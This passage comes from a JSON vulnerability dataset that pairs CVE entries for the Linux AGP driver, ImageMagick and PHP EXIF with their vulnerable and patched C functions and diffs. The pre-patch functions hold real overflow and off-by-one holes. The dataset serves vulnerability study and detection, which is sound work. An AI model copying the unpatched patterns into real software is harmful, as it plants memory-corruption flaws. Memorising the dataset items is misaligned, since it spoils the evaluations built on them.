        "func": "static struct agp_memory *agp_create_user_memory(unsigned long num_agp_pages)\n{\n\tstruct agp_memory *new;\n\tunsigned long alloc_size = num_agp_pages*sizeof(struct page *);\n\n\tif (INT_MAX/sizeof(struct page *) < num_agp_pages)\n\t\treturn NULL;\n\n\tnew = kzalloc(sizeof(struct agp_memory), GFP_KERNEL);\n\tif (new == NULL)\n\t\treturn NULL;\n\n\tnew->key = agp_get_key();\n\n\tif (new->key < 0) {\n\t\tkfree(new);\n\t\treturn NULL;\n\t}\n\n\tagp_alloc_page_array(alloc_size, new);\n\n\tif (new->pages == NULL) {\n\t\tagp_free_key(new->key);\n\t\tkfree(new);\n\t\treturn NULL;\n\t}\n\tnew->num_scratch_pages = 0;\n\treturn new;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,6 +2,9 @@\n {\n \tstruct agp_memory *new;\n \tunsigned long alloc_size = num_agp_pages*sizeof(struct page *);\n+\n+\tif (INT_MAX/sizeof(struct page *) < num_agp_pages)\n+\t\treturn NULL;\n \n \tnew = kzalloc(sizeof(struct agp_memory), GFP_KERNEL);\n \tif (new == NULL)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\tif (INT_MAX/sizeof(struct page *) < num_agp_pages)",
                "\t\treturn NULL;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1746",
        "func_name": "torvalds/linux/agp_allocate_memory",
        "description": "Multiple integer overflows in the (1) agp_allocate_memory and (2) agp_create_user_memory functions in drivers/char/agp/generic.c in the Linux kernel before 2.6.38.5 allow local users to trigger buffer overflows, and consequently cause a denial of service (system crash) or possibly have unspecified other impact, via vectors related to calls that specify a large number of memory pages.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=b522f02184b413955f3bc952e3776ce41edc6355",
        "commit_title": "page_count is copied from userspace.  agp_allocate_memory() tries to",
        "commit_text": "check whether this number is too big, but doesn't take into account the wrap case.  Also agp_create_user_memory() doesn't check whether alloc_size is calculated from num_agp_pages variable without overflow. This may lead to allocation of too small buffer with following buffer overflow.  Another problem in agp code is not addressed in the patch - kernel memory exhaustion (AGPIOC_RESERVE and AGPIOC_ALLOCATE ioctls).  It is not checked whether requested pid is a pid of the caller (no check in agpioc_reserve_wrap()). Each allocation is limited to 16KB, though, there is no per-process limit. This might lead to OOM situation, which is not even solved in case of the caller death by OOM killer - the memory is allocated for another (faked) process.  ",
        "func_before": "struct agp_memory *agp_allocate_memory(struct agp_bridge_data *bridge,\n\t\t\t\t\tsize_t page_count, u32 type)\n{\n\tint scratch_pages;\n\tstruct agp_memory *new;\n\tsize_t i;\n\n\tif (!bridge)\n\t\treturn NULL;\n\n\tif ((atomic_read(&bridge->current_memory_agp) + page_count) > bridge->max_memory_agp)\n\t\treturn NULL;\n\n\tif (type >= AGP_USER_TYPES) {\n\t\tnew = agp_generic_alloc_user(page_count, type);\n\t\tif (new)\n\t\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tif (type != 0) {\n\t\tnew = bridge->driver->alloc_by_type(page_count, type);\n\t\tif (new)\n\t\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tscratch_pages = (page_count + ENTRIES_PER_PAGE - 1) / ENTRIES_PER_PAGE;\n\n\tnew = agp_create_memory(scratch_pages);\n\n\tif (new == NULL)\n\t\treturn NULL;\n\n\tif (bridge->driver->agp_alloc_pages) {\n\t\tif (bridge->driver->agp_alloc_pages(bridge, new, page_count)) {\n\t\t\tagp_free_memory(new);\n\t\t\treturn NULL;\n\t\t}\n\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tfor (i = 0; i < page_count; i++) {\n\t\tstruct page *page = bridge->driver->agp_alloc_page(bridge);\n\n\t\tif (page == NULL) {\n\t\t\tagp_free_memory(new);\n\t\t\treturn NULL;\n\t\t}\n\t\tnew->pages[i] = page;\n\t\tnew->page_count++;\n\t}\n\tnew->bridge = bridge;\n\n\treturn new;\n}",
        "func": "struct agp_memory *agp_allocate_memory(struct agp_bridge_data *bridge,\n\t\t\t\t\tsize_t page_count, u32 type)\n{\n\tint scratch_pages;\n\tstruct agp_memory *new;\n\tsize_t i;\n\tint cur_memory;\n\n\tif (!bridge)\n\t\treturn NULL;\n\n\tcur_memory = atomic_read(&bridge->current_memory_agp);\n\tif ((cur_memory + page_count > bridge->max_memory_agp) ||\n\t    (cur_memory + page_count < page_count))\n\t\treturn NULL;\n\n\tif (type >= AGP_USER_TYPES) {\n\t\tnew = agp_generic_alloc_user(page_count, type);\n\t\tif (new)\n\t\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tif (type != 0) {\n\t\tnew = bridge->driver->alloc_by_type(page_count, type);\n\t\tif (new)\n\t\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tscratch_pages = (page_count + ENTRIES_PER_PAGE - 1) / ENTRIES_PER_PAGE;\n\n\tnew = agp_create_memory(scratch_pages);\n\n\tif (new == NULL)\n\t\treturn NULL;\n\n\tif (bridge->driver->agp_alloc_pages) {\n\t\tif (bridge->driver->agp_alloc_pages(bridge, new, page_count)) {\n\t\t\tagp_free_memory(new);\n\t\t\treturn NULL;\n\t\t}\n\t\tnew->bridge = bridge;\n\t\treturn new;\n\t}\n\n\tfor (i = 0; i < page_count; i++) {\n\t\tstruct page *page = bridge->driver->agp_alloc_page(bridge);\n\n\t\tif (page == NULL) {\n\t\t\tagp_free_memory(new);\n\t\t\treturn NULL;\n\t\t}\n\t\tnew->pages[i] = page;\n\t\tnew->page_count++;\n\t}\n\tnew->bridge = bridge;\n\n\treturn new;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,11 +4,14 @@\n \tint scratch_pages;\n \tstruct agp_memory *new;\n \tsize_t i;\n+\tint cur_memory;\n \n \tif (!bridge)\n \t\treturn NULL;\n \n-\tif ((atomic_read(&bridge->current_memory_agp) + page_count) > bridge->max_memory_agp)\n+\tcur_memory = atomic_read(&bridge->current_memory_agp);\n+\tif ((cur_memory + page_count > bridge->max_memory_agp) ||\n+\t    (cur_memory + page_count < page_count))\n \t\treturn NULL;\n \n \tif (type >= AGP_USER_TYPES) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tif ((atomic_read(&bridge->current_memory_agp) + page_count) > bridge->max_memory_agp)"
            ],
            "added_lines": [
                "\tint cur_memory;",
                "\tcur_memory = atomic_read(&bridge->current_memory_agp);",
                "\tif ((cur_memory + page_count > bridge->max_memory_agp) ||",
                "\t    (cur_memory + page_count < page_count))"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-10145",
        "func_name": "ImageMagick/ExtractPostscript",
        "description": "Off-by-one error in coders/wpg.c in ImageMagick allows remote attackers to have unspecified impact via vectors related to a string copy.",
        "git_url": "https://github.com/ImageMagick/ImageMagick/commit/d23beebe7b1179fb75db1e85fbca3100e49593d9",
        "commit_title": "...",
        "commit_text": "",
        "func_before": "static Image *ExtractPostscript(Image *image,const ImageInfo *image_info,\n  MagickOffsetType PS_Offset,ssize_t PS_Size,ExceptionInfo *exception)\n{\n  char\n    postscript_file[MaxTextExtent];\n\n  const MagicInfo\n    *magic_info;\n\n  FILE\n    *ps_file;\n\n  ImageInfo\n    *clone_info;\n\n  Image\n    *image2;\n\n  unsigned char\n    magick[2*MaxTextExtent];\n\n\n  if ((clone_info=CloneImageInfo(image_info)) == NULL)\n    return(image);\n  clone_info->blob=(void *) NULL;\n  clone_info->length=0;\n\n  /* Obtain temporary file */\n  (void) AcquireUniqueFilename(postscript_file);\n  ps_file=fopen_utf8(postscript_file,\"wb\");\n  if (ps_file == (FILE *) NULL)\n    goto FINISH;\n\n  /* Copy postscript to temporary file */\n  (void) SeekBlob(image,PS_Offset,SEEK_SET);\n  (void) ReadBlob(image, 2*MaxTextExtent, magick);\n\n  (void) SeekBlob(image,PS_Offset,SEEK_SET);\n  while(PS_Size-- > 0)\n    {\n      (void) fputc(ReadBlobByte(image),ps_file);\n    }\n  (void) fclose(ps_file);\n\n    /* Detect file format - Check magic.mgk configuration file. */\n  magic_info=GetMagicInfo(magick,2*MaxTextExtent,exception);\n  if(magic_info == (const MagicInfo *) NULL) goto FINISH_UNL;\n  /*     printf(\"Detected:%s  \\n\",magic_info->name); */\n  if(exception->severity != UndefinedException) goto FINISH_UNL;\n  if(magic_info->name == (char *) NULL) goto FINISH_UNL;\n\n  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent);\n\n    /* Read nested image */\n  /*FormatString(clone_info->filename,\"%s:%s\",magic_info->name,postscript_file);*/\n  FormatLocaleString(clone_info->filename,MaxTextExtent,\"%s\",postscript_file);\n  image2=ReadImage(clone_info,exception);\n\n  if (!image2)\n    goto FINISH_UNL;\n\n  /*\n    Replace current image with new image while copying base image\n    attributes.\n  */\n  (void) CopyMagickString(image2->filename,image->filename,MaxTextExtent);\n  (void) CopyMagickString(image2->magick_filename,image->magick_filename,MaxTextExtent);\n  (void) CopyMagickString(image2->magick,image->magick,MaxTextExtent);\n  image2->depth=image->depth;\n  DestroyBlob(image2);\n  image2->blob=ReferenceBlob(image->blob);\n\n  if ((image->rows == 0) || (image->columns == 0))\n    DeleteImageFromList(&image);\n\n  AppendImageToList(&image,image2);\n\n FINISH_UNL:\n  (void) RelinquishUniqueFileResource(postscript_file);\n FINISH:\n  DestroyImageInfo(clone_info);\n  return(image);\n}",
        "func": "static Image *ExtractPostscript(Image *image,const ImageInfo *image_info,\n  MagickOffsetType PS_Offset,ssize_t PS_Size,ExceptionInfo *exception)\n{\n  char\n    postscript_file[MaxTextExtent];\n\n  const MagicInfo\n    *magic_info;\n\n  FILE\n    *ps_file;\n\n  ImageInfo\n    *clone_info;\n\n  Image\n    *image2;\n\n  unsigned char\n    magick[2*MaxTextExtent];\n\n\n  if ((clone_info=CloneImageInfo(image_info)) == NULL)\n    return(image);\n  clone_info->blob=(void *) NULL;\n  clone_info->length=0;\n\n  /* Obtain temporary file */\n  (void) AcquireUniqueFilename(postscript_file);\n  ps_file=fopen_utf8(postscript_file,\"wb\");\n  if (ps_file == (FILE *) NULL)\n    goto FINISH;\n\n  /* Copy postscript to temporary file */\n  (void) SeekBlob(image,PS_Offset,SEEK_SET);\n  (void) ReadBlob(image, 2*MaxTextExtent, magick);\n\n  (void) SeekBlob(image,PS_Offset,SEEK_SET);\n  while(PS_Size-- > 0)\n    {\n      (void) fputc(ReadBlobByte(image),ps_file);\n    }\n  (void) fclose(ps_file);\n\n    /* Detect file format - Check magic.mgk configuration file. */\n  magic_info=GetMagicInfo(magick,2*MaxTextExtent,exception);\n  if(magic_info == (const MagicInfo *) NULL) goto FINISH_UNL;\n  /*     printf(\"Detected:%s  \\n\",magic_info->name); */\n  if(exception->severity != UndefinedException) goto FINISH_UNL;\n  if(magic_info->name == (char *) NULL) goto FINISH_UNL;\n\n  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent-1);\n\n    /* Read nested image */\n  /*FormatString(clone_info->filename,\"%s:%s\",magic_info->name,postscript_file);*/\n  FormatLocaleString(clone_info->filename,MaxTextExtent,\"%s\",postscript_file);\n  image2=ReadImage(clone_info,exception);\n\n  if (!image2)\n    goto FINISH_UNL;\n\n  /*\n    Replace current image with new image while copying base image\n    attributes.\n  */\n  (void) CopyMagickString(image2->filename,image->filename,MaxTextExtent);\n  (void) CopyMagickString(image2->magick_filename,image->magick_filename,MaxTextExtent);\n  (void) CopyMagickString(image2->magick,image->magick,MaxTextExtent);\n  image2->depth=image->depth;\n  DestroyBlob(image2);\n  image2->blob=ReferenceBlob(image->blob);\n\n  if ((image->rows == 0) || (image->columns == 0))\n    DeleteImageFromList(&image);\n\n  AppendImageToList(&image,image2);\n\n FINISH_UNL:\n  (void) RelinquishUniqueFileResource(postscript_file);\n FINISH:\n  DestroyImageInfo(clone_info);\n  return(image);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -49,7 +49,7 @@\n   if(exception->severity != UndefinedException) goto FINISH_UNL;\n   if(magic_info->name == (char *) NULL) goto FINISH_UNL;\n \n-  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent);\n+  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent-1);\n \n     /* Read nested image */\n   /*FormatString(clone_info->filename,\"%s:%s\",magic_info->name,postscript_file);*/",
        "diff_line_info": {
            "deleted_lines": [
                "  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent);"
            ],
            "added_lines": [
                "  (void) strncpy(clone_info->magick,magic_info->name,MaxTextExtent-1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-7513",
        "func_name": "ImageMagick/ClonePixelCacheRepository",
        "description": "Off-by-one error in magick/cache.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via unspecified vectors.",
        "git_url": "https://github.com/ImageMagick/ImageMagick/commit/a54fe0e8600eaf3dc6fe717d3c0398001507f723",
        "commit_title": "",
        "commit_text": "",
        "func_before": "static MagickBooleanType ClonePixelCacheRepository(\n  CacheInfo *restrict clone_info,CacheInfo *restrict cache_info,\n  ExceptionInfo *exception)\n{\n#define MaxCacheThreads  2\n#define cache_threads(source,destination,chunk) \\\n  num_threads((chunk) < (16*GetMagickResourceLimit(ThreadResource)) ? 1 : \\\n    GetMagickResourceLimit(ThreadResource) < MaxCacheThreads ? \\\n    GetMagickResourceLimit(ThreadResource) : MaxCacheThreads)\n\n  MagickBooleanType\n    status;\n\n  NexusInfo\n    **restrict cache_nexus,\n    **restrict clone_nexus;\n\n  size_t\n    length;\n\n  ssize_t\n    y;\n\n  assert(cache_info != (CacheInfo *) NULL);\n  assert(clone_info != (CacheInfo *) NULL);\n  assert(exception != (ExceptionInfo *) NULL);\n  if (cache_info->type == PingCache)\n    return(MagickTrue);\n  if (((cache_info->type == MemoryCache) || (cache_info->type == MapCache)) &&\n      ((clone_info->type == MemoryCache) || (clone_info->type == MapCache)) &&\n      (cache_info->columns == clone_info->columns) &&\n      (cache_info->rows == clone_info->rows) &&\n      (cache_info->active_index_channel == clone_info->active_index_channel))\n    {\n      /*\n        Identical pixel cache morphology.\n      */\n      CopyPixels(clone_info->pixels,cache_info->pixels,cache_info->columns*\n        cache_info->rows);\n      if ((cache_info->active_index_channel != MagickFalse) &&\n          (clone_info->active_index_channel != MagickFalse))\n        (void) memcpy(clone_info->indexes,cache_info->indexes,\n          cache_info->columns*cache_info->rows*sizeof(*cache_info->indexes));\n      return(MagickTrue);\n    }\n  /*\n    Mismatched pixel cache morphology.\n  */\n  cache_nexus=AcquirePixelCacheNexus(MaxCacheThreads);\n  clone_nexus=AcquirePixelCacheNexus(MaxCacheThreads);\n  if ((cache_nexus == (NexusInfo **) NULL) ||\n      (clone_nexus == (NexusInfo **) NULL))\n    ThrowFatalException(ResourceLimitFatalError,\"MemoryAllocationFailed\");\n  length=(size_t) MagickMin(cache_info->columns,clone_info->columns)*\n    sizeof(*cache_info->pixels);\n  status=MagickTrue;\n#if defined(MAGICKCORE_OPENMP_SUPPORT)\n  #pragma omp parallel for schedule(static,4) shared(status) \\\n    cache_threads(cache_info,clone_info,cache_info->rows)\n#endif\n  for (y=0; y < (ssize_t) cache_info->rows; y++)\n  {\n    const int\n      id = GetOpenMPThreadId();\n\n    PixelPacket\n      *pixels;\n\n    RectangleInfo\n      region;\n\n    if (status == MagickFalse)\n      continue;\n    if (y >= (ssize_t) clone_info->rows)\n      continue;\n    region.width=cache_info->columns;\n    region.height=1;\n    region.x=0;\n    region.y=y;\n    pixels=SetPixelCacheNexusPixels(cache_info,ReadMode,&region,MagickTrue,\n      cache_nexus[id],exception);\n    if (pixels == (PixelPacket *) NULL)\n      continue;\n    status=ReadPixelCachePixels(cache_info,cache_nexus[id],exception);\n    if (status == MagickFalse)\n      continue;\n    region.width=clone_info->columns;\n    pixels=SetPixelCacheNexusPixels(clone_info,WriteMode,&region,MagickTrue,\n      clone_nexus[id],exception);\n    if (pixels == (PixelPacket *) NULL)\n      continue;\n    (void) ResetMagickMemory(clone_nexus[id]->pixels,0,(size_t)\n      clone_nexus[id]->length);\n    (void) memcpy(clone_nexus[id]->pixels,cache_nexus[id]->pixels,length);\n    status=WritePixelCachePixels(clone_info,clone_nexus[id],exception);\n  }\n  if ((cache_info->active_index_channel != MagickFalse) &&\n      (clone_info->active_index_channel != MagickFalse))\n    {\n      /*\n        Clone indexes.\n      */\n      length=(size_t) MagickMin(cache_info->columns,clone_info->columns)*\n        sizeof(*cache_info->indexes);\n#if defined(MAGICKCORE_OPENMP_SUPPORT)\n      #pragma omp parallel for schedule(static,4) shared(status) \\\n        cache_threads(cache_info,clone_info,cache_info->rows)\n#endif\n      for (y=0; y < (ssize_t) cache_info->rows; y++)\n      {\n        const int\n          id = GetOpenMPThreadId();\n\n        PixelPacket\n          *pixels;\n\n        RectangleInfo\n          region;\n\n        if (status == MagickFalse)\n          continue;\n        if (y >= (ssize_t) clone_info->rows)\n          continue;\n        region.width=cache_info->columns;\n        region.height=1;\n        region.x=0;\n        region.y=y;\n        pixels=SetPixelCacheNexusPixels(cache_info,ReadMode,&region,MagickTrue,\n          cache_nexus[id],exception);\n        if (pixels == (PixelPacket *) NULL)\n          continue;\n        status=ReadPixelCacheIndexes(cache_info,cache_nexus[id],exception);\n        if (status == MagickFalse)\n          continue;\n        region.width=clone_info->columns;\n        pixels=SetPixelCacheNexusPixels(clone_info,WriteMode,&region,MagickTrue,\n          clone_nexus[id],exception);\n        if (pixels == (PixelPacket *) NULL)\n          continue;\n        (void) memcpy(clone_nexus[id]->indexes,cache_nexus[id]->indexes,length);\n        status=WritePixelCacheIndexes(clone_info,clone_nexus[id],exception);\n      }\n    }\n  cache_nexus=DestroyPixelCacheNexus(cache_nexus,MaxCacheThreads);\n  clone_nexus=DestroyPixelCacheNexus(clone_nexus,MaxCacheThreads);\n  if (cache_info->debug != MagickFalse)\n    {\n      char\n        message[MaxTextExtent];\n\n      (void) FormatLocaleString(message,MaxTextExtent,\"%s => %s\",\n        CommandOptionToMnemonic(MagickCacheOptions,(ssize_t) cache_info->type),\n        CommandOptionToMnemonic(MagickCacheOptions,(ssize_t) clone_info->type));\n      (void) LogMagickEvent(CacheEvent,GetMagickModule(),\"%s\",message);\n    }\n  return(status);\n}",
        "func": "static MagickBooleanType ClonePixelCacheRepository(\n  CacheInfo *restrict clone_info,CacheInfo *restrict cache_info,\n  ExceptionInfo *exception)\n{\n#define MaxCacheThreads  2\n#define cache_threads(source,destination,chunk) \\\n  num_threads((chunk) < (16*GetMagickResourceLimit(ThreadResource)) ? 1 : \\\n    GetMagickResourceLimit(ThreadResource) < MaxCacheThreads ? \\\n    GetMagickResourceLimit(ThreadResource) : MaxCacheThreads)\n\n  MagickBooleanType\n    status;\n\n  NexusInfo\n    **restrict cache_nexus,\n    **restrict clone_nexus;\n\n  size_t\n    length;\n\n  ssize_t\n    y;\n\n  assert(cache_info != (CacheInfo *) NULL);\n  assert(clone_info != (CacheInfo *) NULL);\n  assert(exception != (ExceptionInfo *) NULL);\n  if (cache_info->type == PingCache)\n    return(MagickTrue);\n  if (((cache_info->type == MemoryCache) || (cache_info->type == MapCache)) &&\n      ((clone_info->type == MemoryCache) || (clone_info->type == MapCache)) &&\n      (cache_info->columns == clone_info->columns) &&\n      (cache_info->rows == clone_info->rows) &&\n      (cache_info->active_index_channel == clone_info->active_index_channel))\n    {\n      /*\n        Identical pixel cache morphology.\n      */\n      (void) memcpy(clone_info->pixels,cache_info->pixels,cache_info->columns*\n        cache_info->rows*sizeof(*cache_info->pixels));\n      if ((cache_info->active_index_channel != MagickFalse) &&\n          (clone_info->active_index_channel != MagickFalse))\n        (void) memcpy(clone_info->indexes,cache_info->indexes,\n          cache_info->columns*cache_info->rows*sizeof(*cache_info->indexes));\n      return(MagickTrue);\n    }\n  /*\n    Mismatched pixel cache morphology.\n  */\n  cache_nexus=AcquirePixelCacheNexus(MaxCacheThreads);\n  clone_nexus=AcquirePixelCacheNexus(MaxCacheThreads);\n  if ((cache_nexus == (NexusInfo **) NULL) ||\n      (clone_nexus == (NexusInfo **) NULL))\n    ThrowFatalException(ResourceLimitFatalError,\"MemoryAllocationFailed\");\n  length=(size_t) MagickMin(cache_info->columns,clone_info->columns)*\n    sizeof(*cache_info->pixels);\n  status=MagickTrue;\n#if defined(MAGICKCORE_OPENMP_SUPPORT)\n  #pragma omp parallel for schedule(static,4) shared(status) \\\n    cache_threads(cache_info,clone_info,cache_info->rows)\n#endif\n  for (y=0; y < (ssize_t) cache_info->rows; y++)\n  {\n    const int\n      id = GetOpenMPThreadId();\n\n    PixelPacket\n      *pixels;\n\n    RectangleInfo\n      region;\n\n    if (status == MagickFalse)\n      continue;\n    if (y >= (ssize_t) clone_info->rows)\n      continue;\n    region.width=cache_info->columns;\n    region.height=1;\n    region.x=0;\n    region.y=y;\n    pixels=SetPixelCacheNexusPixels(cache_info,ReadMode,&region,MagickTrue,\n      cache_nexus[id],exception);\n    if (pixels == (PixelPacket *) NULL)\n      continue;\n    status=ReadPixelCachePixels(cache_info,cache_nexus[id],exception);\n    if (status == MagickFalse)\n      continue;\n    region.width=clone_info->columns;\n    pixels=SetPixelCacheNexusPixels(clone_info,WriteMode,&region,MagickTrue,\n      clone_nexus[id],exception);\n    if (pixels == (PixelPacket *) NULL)\n      continue;\n    (void) ResetMagickMemory(clone_nexus[id]->pixels,0,(size_t)\n      clone_nexus[id]->length);\n    (void) memcpy(clone_nexus[id]->pixels,cache_nexus[id]->pixels,length);\n    status=WritePixelCachePixels(clone_info,clone_nexus[id],exception);\n  }\n  if ((cache_info->active_index_channel != MagickFalse) &&\n      (clone_info->active_index_channel != MagickFalse))\n    {\n      /*\n        Clone indexes.\n      */\n      length=(size_t) MagickMin(cache_info->columns,clone_info->columns)*\n        sizeof(*cache_info->indexes);\n#if defined(MAGICKCORE_OPENMP_SUPPORT)\n      #pragma omp parallel for schedule(static,4) shared(status) \\\n        cache_threads(cache_info,clone_info,cache_info->rows)\n#endif\n      for (y=0; y < (ssize_t) cache_info->rows; y++)\n      {\n        const int\n          id = GetOpenMPThreadId();\n\n        PixelPacket\n          *pixels;\n\n        RectangleInfo\n          region;\n\n        if (status == MagickFalse)\n          continue;\n        if (y >= (ssize_t) clone_info->rows)\n          continue;\n        region.width=cache_info->columns;\n        region.height=1;\n        region.x=0;\n        region.y=y;\n        pixels=SetPixelCacheNexusPixels(cache_info,ReadMode,&region,MagickTrue,\n          cache_nexus[id],exception);\n        if (pixels == (PixelPacket *) NULL)\n          continue;\n        status=ReadPixelCacheIndexes(cache_info,cache_nexus[id],exception);\n        if (status == MagickFalse)\n          continue;\n        region.width=clone_info->columns;\n        pixels=SetPixelCacheNexusPixels(clone_info,WriteMode,&region,MagickTrue,\n          clone_nexus[id],exception);\n        if (pixels == (PixelPacket *) NULL)\n          continue;\n        (void) memcpy(clone_nexus[id]->indexes,cache_nexus[id]->indexes,length);\n        status=WritePixelCacheIndexes(clone_info,clone_nexus[id],exception);\n      }\n    }\n  cache_nexus=DestroyPixelCacheNexus(cache_nexus,MaxCacheThreads);\n  clone_nexus=DestroyPixelCacheNexus(clone_nexus,MaxCacheThreads);\n  if (cache_info->debug != MagickFalse)\n    {\n      char\n        message[MaxTextExtent];\n\n      (void) FormatLocaleString(message,MaxTextExtent,\"%s => %s\",\n        CommandOptionToMnemonic(MagickCacheOptions,(ssize_t) cache_info->type),\n        CommandOptionToMnemonic(MagickCacheOptions,(ssize_t) clone_info->type));\n      (void) LogMagickEvent(CacheEvent,GetMagickModule(),\"%s\",message);\n    }\n  return(status);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -35,8 +35,8 @@\n       /*\n         Identical pixel cache morphology.\n       */\n-      CopyPixels(clone_info->pixels,cache_info->pixels,cache_info->columns*\n-        cache_info->rows);\n+      (void) memcpy(clone_info->pixels,cache_info->pixels,cache_info->columns*\n+        cache_info->rows*sizeof(*cache_info->pixels));\n       if ((cache_info->active_index_channel != MagickFalse) &&\n           (clone_info->active_index_channel != MagickFalse))\n         (void) memcpy(clone_info->indexes,cache_info->indexes,",
        "diff_line_info": {
            "deleted_lines": [
                "      CopyPixels(clone_info->pixels,cache_info->pixels,cache_info->columns*",
                "        cache_info->rows);"
            ],
            "added_lines": [
                "      (void) memcpy(clone_info->pixels,cache_info->pixels,cache_info->columns*",
                "        cache_info->rows*sizeof(*cache_info->pixels));"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-10158",
        "func_name": "php/php-src/exif_convert_any_to_int",
        "description": "The exif_convert_any_to_int function in ext/exif/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.",
        "git_url": "https://github.com/php/php-src/commit/1cda0d7c2ffb62d8331c64e703131d9cabdc03ea",
        "commit_title": "Fix bug #73737 FPE when parsing a tag format",
        "commit_text": "",
        "func_before": "static size_t exif_convert_any_to_int(void *value, int format, int motorola_intel TSRMLS_DC)\n{\n\tint \t\ts_den;\n\tunsigned \tu_den;\n\n\tswitch(format) {\n\t\tcase TAG_FMT_SBYTE:     return *(signed char *)value;\n\t\tcase TAG_FMT_BYTE:      return *(uchar *)value;\n\n\t\tcase TAG_FMT_USHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_ULONG:     return php_ifd_get32u(value, motorola_intel);\n\n\t\tcase TAG_FMT_URATIONAL:\n\t\t\tu_den = php_ifd_get32u(4+(char *)value, motorola_intel);\n\t\t\tif (u_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32u(value, motorola_intel) / u_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SRATIONAL:\n\t\t\ts_den = php_ifd_get32s(4+(char *)value, motorola_intel);\n\t\t\tif (s_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32s(value, motorola_intel) / s_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_SLONG:     return php_ifd_get32s(value, motorola_intel);\n\n\t\t/* Not sure if this is correct (never seen float used in Exif format) */\n\t\tcase TAG_FMT_SINGLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type single\");\n#endif\n\t\t\treturn (size_t)*(float *)value;\n\t\tcase TAG_FMT_DOUBLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type double\");\n#endif\n\t\t\treturn (size_t)*(double *)value;\n\t}\n\treturn 0;\n}",
        "func": "static size_t exif_convert_any_to_int(void *value, int format, int motorola_intel TSRMLS_DC)\n{\n\tint \t\ts_den;\n\tunsigned \tu_den;\n\n\tswitch(format) {\n\t\tcase TAG_FMT_SBYTE:     return *(signed char *)value;\n\t\tcase TAG_FMT_BYTE:      return *(uchar *)value;\n\n\t\tcase TAG_FMT_USHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_ULONG:     return php_ifd_get32u(value, motorola_intel);\n\n\t\tcase TAG_FMT_URATIONAL:\n\t\t\tu_den = php_ifd_get32u(4+(char *)value, motorola_intel);\n\t\t\tif (u_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn php_ifd_get32u(value, motorola_intel) / u_den;\n\t\t\t}\n\n\t\tcase TAG_FMT_SRATIONAL:\n\t\t\ts_den = php_ifd_get32s(4+(char *)value, motorola_intel);\n\t\t\tif (s_den == 0) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) / s_den);\n\t\t\t}\n\n\t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\n\t\tcase TAG_FMT_SLONG:     return php_ifd_get32s(value, motorola_intel);\n\n\t\t/* Not sure if this is correct (never seen float used in Exif format) */\n\t\tcase TAG_FMT_SINGLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type single\");\n#endif\n\t\t\treturn (size_t)*(float *)value;\n\t\tcase TAG_FMT_DOUBLE:\n#ifdef EXIF_DEBUG\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_NOTICE, \"Found value of type double\");\n#endif\n\t\t\treturn (size_t)*(double *)value;\n\t}\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -23,7 +23,7 @@\n \t\t\tif (s_den == 0) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n-\t\t\t\treturn php_ifd_get32s(value, motorola_intel) / s_den;\n+\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) / s_den);\n \t\t\t}\n \n \t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\treturn php_ifd_get32s(value, motorola_intel) / s_den;"
            ],
            "added_lines": [
                "\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) / s_den);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-10094",
        "func_name": "vadz/libtiff/t2p_readwrite_pdf_image_tile",
        "description": "Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.",
        "git_url": "https://github.com/vadz/libtiff/commit/c7153361a4041260719b340f73f2f76b0969235c",
        "commit_title": "* tools/tiff2pdf.c: avoid potential heap-based overflow in",
